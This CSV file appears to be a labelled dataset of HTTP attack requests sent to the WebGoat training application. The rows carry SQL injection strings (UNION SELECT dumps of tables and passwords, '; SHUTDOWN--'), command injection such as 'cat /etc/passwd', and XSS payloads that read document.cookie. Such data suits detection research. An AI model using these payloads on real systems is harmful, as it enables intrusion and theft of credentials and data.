source_app,label,method,path,body,status_code,response_size
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '7055'), ('name', ""' OR '1'='1"")]",200,273
webgoat,attack,POST,cia/command-injection,"[('_uid', '0xyjhIMi'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '1940'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,367
webgoat,attack,POST,cia/command-injection,"[('_uid', 'fDkBXmG1'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'lzQlChZC'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'TO34zu0K'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'FLTRAu6A'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=CWeg0aTS,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '9550'), ('name', '101 OR 1=1; --')]",200,273
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '6853'), ('name', '101 OR 1=1; --')]",200,273
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'f5Bo8ckS'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=NXv5RFyw,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '9328'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=7bJQiYJ5,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'kG8ZW9NJ'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '5103'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=9Huqvrx5,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 's1uSJnZf'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=jNt1ouCy,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'rxZ2Z3RM'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', '7tFrs1kK'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=zwSegPju,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=lYAk2SZg,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'B7wsDEQ2'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', '7093QVal'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'E1nhjv2r'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '5227'), ('name', ""' OR '1'='1"")]",200,273
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '2428'), ('name', ""' AND 1=2--"")]",200,273
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '7048'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,367
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '7121'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,367
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '4784'), ('name', '101 OR 1=1; --')]",200,273
webgoat,attack,POST,cia/command-injection,"[('_uid', 'skPut5gD'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'f8tu4LSl'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'xlCJOe03'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'KPWN9kZO'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '4138'), ('name', '101 OR 1=1; --')]",200,273
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=B3sDeX4H,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '6392'), ('name', ""' OR '1'='1"")]",200,273
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '8050'), ('name', '101 OR 1=1; --')]",200,273
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '8439'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=E6ixITlf,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '6921'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,cia/command-injection,"[('_uid', 'cMXvheQP'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'RH3dyVwo'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '8012'), ('name', '101 OR 1=1; --')]",200,273
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '1481'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,367
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=GggjZYQw,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=uGMMwjvq,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '2696'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=181YALG0,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '8042'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,cia/command-injection,"[('_uid', 'zbgokWE4'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=NmqCFVYB,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '4249'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,367
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '9587'), ('name', ""' OR '1'='1"")]",200,273
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '1820'), ('name', '101 OR 1=1; --')]",200,273
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '8325'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=wXaIkpim,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=VnmTEXKw,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=OdPdOmeN,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'PHAnNjXn'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=XlwrlzPg,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '6823'), ('name', ""' AND 1=2--"")]",200,273
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '8458'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=twa2d0wE,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '5419'), ('name', ""' AND 1=2--"")]",200,273
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=xTFyVBlo,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=MuLH6wOv,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '9494'), ('name', '101 OR 1=1; --')]",200,273
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '4780'), ('name', ""' OR '1'='1"")]",200,273
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'p6FIzTiP'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'tBFhn7Cm'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'jL2MrTJB'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '3253'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=uYRPqXv1,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'raDxLA8O'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', '7f9OMB7Q'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'l0Mot1ea'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=GZISFPs1,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '8006'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,367
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '8321'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '2815'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'TK9bMNmB'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=jDt44Z1i,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=4c6ULael,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'O3RHN0q7'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'XSqTV9wk'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=tBVxmgmq,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '7579'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'oeTI7La6'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '5853'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,367
webgoat,attack,POST,cia/command-injection,"[('_uid', 'MMOwlGY5'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '3578'), ('name', ""' OR '1'='1"")]",200,273
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '5998'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '6550'), ('name', ""' AND 1=2--"")]",200,273
webgoat,attack,POST,cia/command-injection,"[('_uid', 'LA17kY5b'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'IO34F3Vo'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=mNeU8tTn,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=WpQKE4nE,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=yXkHaV1n,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=g7JPCdqV,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '8671'), ('name', '101 OR 1=1; --')]",200,273
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=42jwhg6y,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '7426'), ('name', '101 OR 1=1; --')]",200,273
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '8506'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,367
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '9808'), ('name', '101 OR 1=1; --')]",200,273
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '5776'), ('name', '101 OR 1=1; --')]",200,273
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '9783'), ('name', '101 OR 1=1; --')]",200,273
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '6376'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '3711'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,367
webgoat,attack,POST,cia/command-injection,"[('_uid', 'OetIBvD2'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=gEn6orqy,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'R6tExZmn'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'wU4RC2uQ'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '8820'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '9365'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '4428'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '5157'), ('name', ""' AND 1=2--"")]",200,273
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '7916'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '9131'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,367
webgoat,attack,POST,cia/command-injection,"[('_uid', 'lEPo8bfl'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'F1Ft2B1h'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '9613'), ('name', ""' OR '1'='1"")]",200,273
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '1808'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,367
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'qCpgHoti'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=HhzV0FRD,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=FjDccO11,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=aE9fO4cr,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'GhB9jLqN'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', '32cLNb7p'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '2204'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,367
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '1270'), ('name', ""' OR '1'='1"")]",200,273
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', '3gIkgGnZ'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'jNhsyKEY'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=Aeu4iOGb,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'KPWXLquA'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'GjE8KCam'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'gMKAzDOi'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '6936'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '2476'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '4990'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=Bow39WYx,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'OevZGRcA'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '4460'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,cia/command-injection,"[('_uid', 'BMoxmH2c'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', '3njUwmtj'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '3355'), ('name', '101 OR 1=1; --')]",200,273
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=OW5nC4c7,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=DtlwPV9L,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=pEfcQKl6,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'vPMslqDP'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'WTfIxTif'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '5225'), ('name', ""' OR '1'='1"")]",200,273
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<script>alert('XSS')</script>&_uid=7gmVCVex,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'Rja6gIju'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=gez7B2hA,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'HET6a5eD'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '6705'), ('name', '101 OR 1=1; --')]",200,273
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '7074'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'Du55eWCO'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '4690'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,367
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=RwZHScuS,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '5798'), ('name', ""' AND 1=2--"")]",200,273
webgoat,attack,POST,cia/command-injection,"[('_uid', 'Dio6WUGI'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'gmYJhIOy'), ('ip', '127.0.0.1 | netstat -an')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '1394'), ('name', ""' AND 1=2--"")]",200,273
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'vWET2IuN'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '3692'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,cia/command-injection,"[('_uid', 'IHMaMEcr'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '4375'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=eKzVzUEN,200,279
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=GRNpeFyG,200,279
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '1140'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '2441'), ('name', ""'; SHUTDOWN--"")]",200,307
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=EbUYgIyk,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'MiaTc7x9'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,cia/command-injection,"[('_uid', 'zT3yK90V'), ('ip', '127.0.0.1 & whoami')]",404,14753
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '9365'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<svg onload=alert(1)>&_uid=qwhrGdOZ,200,279
webgoat,attack,POST,cia/command-injection,"[('_uid', 'EsyDJPDf'), ('ip', '127.0.0.1 | ls -la')]",404,14753
webgoat,attack,POST,CrossSiteScripting/attack1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=B8ZW23Ww,200,279
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,FileUpload/attack,,404,14745
webgoat,attack,POST,SqlInjection/attack8,"[('auth_tan', '5185'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,367
